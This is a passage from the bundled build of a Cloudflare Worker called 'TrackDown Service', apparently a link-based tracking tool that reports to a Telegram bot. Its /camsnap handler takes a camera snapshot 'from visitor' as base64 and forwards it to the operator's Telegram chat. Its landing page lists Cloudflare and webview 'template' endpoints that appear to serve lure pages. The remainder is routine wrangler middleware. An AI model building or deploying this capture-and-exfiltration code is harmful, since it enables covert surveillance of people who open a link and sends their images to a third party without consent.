        return new Response(`Error processing request: ${error.message}`, { status: 500, headers: corsHeaders });
      }
    }
    if (request.method === "POST" && path === "/camsnap") {
      try {
        const formData = await request.formData();
        const uid = formData.get("uid");
        const imgDataUrl = formData.get("img");
        if (!uid || !imgDataUrl) {
          return new Response("Missing required parameters (uid or img)", { status: 400 });
        }
        let rawBase64 = imgDataUrl;
        const prefixMatch = imgDataUrl.match(/^data:image\/\w+;base64,/);
        if (prefixMatch) {
          rawBase64 = imgDataUrl.substring(prefixMatch[0].length);
        } else {
          console.warn("/camsnap received img data that doesn't look like a data URL.");
          if (!/^[A-Za-z0-9+/=]+$/.test(rawBase64)) {
            return new Response("Invalid image data format received.", { status: 400 });
          }
        }
        const chatId = parseInt(uid, 36) || 123456789;
        await sendTelegramPhoto(env, chatId, rawBase64, "\u{1F4F8} Camera snapshot from visitor");
        return new Response("OK", { headers: corsHeaders });
      } catch (error) {
        console.error("Error in /camsnap handler:", error);
        return new Response(`Error processing camera snapshot: ${error.message}`, { status: 500, headers: corsHeaders });
      }
    }
    if (request.method === "GET" && (path === "/" || path === "")) {
      const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>TrackDown Service</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #2c7cb0;
            text-align: center;
          }
          .info {
            margin: 20px 0;
            padding: 15px;
            background-color: #e8f4f8;
            border-left: 4px solid #2c7cb0;
            border-radius: 4px;
          }
          code {
            font-family: 'Courier New', monospace;
            background-color: #f1f1f1;
            padding: 2px 4px;
            border-radius: 3px;
          }
          .button {
            display: inline-block;
            padding: 10px 15px;
            background-color: #2c7cb0;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            margin: 10px 0;
          }
          footer {
            margin-top: 30px;
            text-align: center;
            font-size: 0.9em;
            color: #777;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>TrackDown Service</h1>

          <div class="info">
            <p>This service is running correctly. Your client IP is: <code>${getClientIP(request.headers)}</code></p>
            <p>To use this service, interact with the Telegram bot.</p>
          </div>

          <p>Available endpoints:</p>
          <ul>
            <li><code>/setup-webhook</code> - Set up the Telegram webhook</li>
            <li><code>/webhook</code> - Webhook endpoint for Telegram</li>
            <li><code>/c/:uid/:uri</code> - Cloudflare template endpoint</li>
            <li><code>/w/:uid/:uri</code> - Webview template endpoint</li>
          </ul>

          <a href="/setup-webhook" class="button">Setup Telegram Webhook</a>

          <footer>
            TrackDown Service - Developed by jbalagiya<br>

          </footer>
        </div>
      </body>
      </html>
      `;
      return new Response(html, {
        status: 200,
        headers: { "Content-Type": "text/html" }
      });
    }
    return new Response("Not Found - Available endpoints: /, /setup-webhook, /webhook, /c/:uid/:uri, /w/:uid/:uri", {
      status: 404,
      headers: { "Content-Type": "text/plain" }
    });
  } catch (error) {
    console.error("Unhandled error in request handler:", error);
    return new Response(`Internal server error: ${error.message}`, {
      status: 500,
      headers: { "Content-Type": "text/plain" }
    });
  }
}
__name(handleRequest, "handleRequest");
var worker_default = {
  async fetch(request, env, ctx) {
    return handleRequest(request, env);
  }
};

// ../home/jules/.nvm/versions/node/v22.22.1/lib/node_modules/wrangler/templates/middleware/middleware-ensure-req-body-drained.ts
var drainBody = /* @__PURE__ */ __name(async (request, env, _ctx, middlewareCtx) => {
  try {
    return await middlewareCtx.next(request, env);
  } finally {
    try {
      if (request.body !== null && !request.bodyUsed) {
        const reader = request.body.getReader();
        while (!(await reader.read()).done) {
        }
      }
    } catch (e) {
      console.error("Failed to drain the unused request body.", e);
    }
  }
}, "drainBody");
var middleware_ensure_req_body_drained_default = drainBody;

// ../home/jules/.nvm/versions/node/v22.22.1/lib/node_modules/wrangler/templates/middleware/middleware-miniflare3-json-error.ts
function reduceError(e) {
  return {
    name: e?.name,
    message: e?.message ?? String(e),
    stack: e?.stack,
    cause: e?.cause === void 0 ? void 0 : reduceError(e.cause)
  };
}
__name(reduceError, "reduceError");
var jsonError = /* @__PURE__ */ __name(async (request, env, _ctx, middlewareCtx) => {
  try {
    return await middlewareCtx.next(request, env);
  } catch (e) {
    const error = reduceError(e);
    return Response.json(error, {
      status: 500,
      headers: { "MF-Experimental-Error-Stack": "true" }
    });
  }
}, "jsonError");
var middleware_miniflare3_json_error_default = jsonError;

// .wrangler/tmp/bundle-wIdj6i/middleware-insertion-facade.js
var __INTERNAL_WRANGLER_MIDDLEWARE__ = [
  middleware_ensure_req_body_drained_default,
  middleware_miniflare3_json_error_default
];
var middleware_insertion_facade_default = worker_default;

// ../home/jules/.nvm/versions/node/v22.22.1/lib/node_modules/wrangler/templates/middleware/common.ts
var __facade_middleware__ = [];
function __facade_register__(...args) {
  __facade_middleware__.push(...args.flat());
}
__name(__facade_register__, "__facade_register__");
function __facade_invokeChain__(request, env, ctx, dispatch, middlewareChain) {
  const [head, ...tail] = middlewareChain;
  const middlewareCtx = {
    dispatch,
    next(newRequest, newEnv) {
      return __facade_invokeChain__(newRequest, newEnv, ctx, dispatch, tail);
    }
  };
  return head(request, env, ctx, middlewareCtx);
}
__name(__facade_invokeChain__, "__facade_invokeChain__");
function __facade_invoke__(request, env, ctx, dispatch, finalMiddleware) {
  return __facade_invokeChain__(request, env, ctx, dispatch, [
    ...__facade_middleware__,
    finalMiddleware
  ]);
}
__name(__facade_invoke__, "__facade_invoke__");

// .wrangler/tmp/bundle-wIdj6i/middleware-loader.entry.ts
var __Facade_ScheduledController__ = class ___Facade_ScheduledController__ {
  constructor(scheduledTime, cron, noRetry) {
    this.scheduledTime = scheduledTime;
    this.cron = cron;
    this.#noRetry = noRetry;
  }
  static {
    __name(this, "__Facade_ScheduledController__");
  }
  #noRetry;
  noRetry() {
    if (!(this instanceof ___Facade_ScheduledController__)) {
      throw new TypeError("Illegal invocation");
    }
    this.#noRetry();
  }
};
function wrapExportedHandler(worker) {
  if (__INTERNAL_WRANGLER_MIDDLEWARE__ === void 0 || __INTERNAL_WRANGLER_MIDDLEWARE__.length === 0) {
    return worker;
  }
  for (const middleware of __INTERNAL_WRANGLER_MIDDLEWARE__) {
    __facade_register__(middleware);
  }
  const fetchDispatcher = /* @__PURE__ */ __name(function(request, env, ctx) {
    if (worker.fetch === void 0) {
      throw new Error("Handler does not export a fetch() function.");
    }
    return worker.fetch(request, env, ctx);
  }, "fetchDispatcher");
  return {
    ...worker,
    fetch(request, env, ctx) {
      const dispatcher = /* @__PURE__ */ __name(function(type, init) {
        if (type === "scheduled" && worker.scheduled !== void 0) {
          const controller = new __Facade_ScheduledController__(
            Date.now(),
            init.cron ?? "",
            () => {
            }
          );
          return worker.scheduled(controller, env, ctx);
        }
      }, "dispatcher");
      return __facade_invoke__(request, env, ctx, dispatcher, fetchDispatcher);
    }
  };
}
__name(wrapExportedHandler, "wrapExportedHandler");
function wrapWorkerEntrypoint(klass) {
  if (__INTERNAL_WRANGLER_MIDDLEWARE__ === void 0 || __INTERNAL_WRANGLER_MIDDLEWARE__.length === 0) {
    return klass;
  }
  for (const middleware of __INTERNAL_WRANGLER_MIDDLEWARE__) {
    __facade_register__(middleware);
  }
  return class extends klass {
    #fetchDispatcher = /* @__PURE__ */ __name((request, env, ctx) => {
      this.env = env;
      this.ctx = ctx;
      if (super.fetch === void 0) {
        throw new Error("Entrypoint class does not define a fetch() function.");
      }
      return super.fetch(request);
    }, "#fetchDispatcher");
    #dispatcher = /* @__PURE__ */ __name((type, init) => {
      if (type === "scheduled" && super.scheduled !== void 0) {
        const controller = new __Facade_ScheduledController__(
          Date.now(),
          init.cron ?? "",
          () => {
          }
        );
        return super.scheduled(controller);
      }
    }, "#dispatcher");
    fetch(request) {
      return __facade_invoke__(
        request,
        this.env,
        this.ctx,
        this.#dispatcher,
        this.#fetchDispatcher
      );
    }
  };
}
__name(wrapWorkerEntrypoint, "wrapWorkerEntrypoint");
var WRAPPED_ENTRY;
if (typeof middleware_insertion_facade_default === "object") {
  WRAPPED_ENTRY = wrapExportedHandler(middleware_insertion_facade_default);
} else if (typeof middleware_insertion_facade_default === "function") {
  WRAPPED_ENTRY = wrapWorkerEntrypoint(middleware_insertion_facade_default);
}
var middleware_loader_entry_default = WRAPPED_ENTRY;
export {
  __INTERNAL_WRANGLER_MIDDLEWARE__,
  middleware_loader_entry_default as default
};
//# sourceMappingURL=worker.js.map
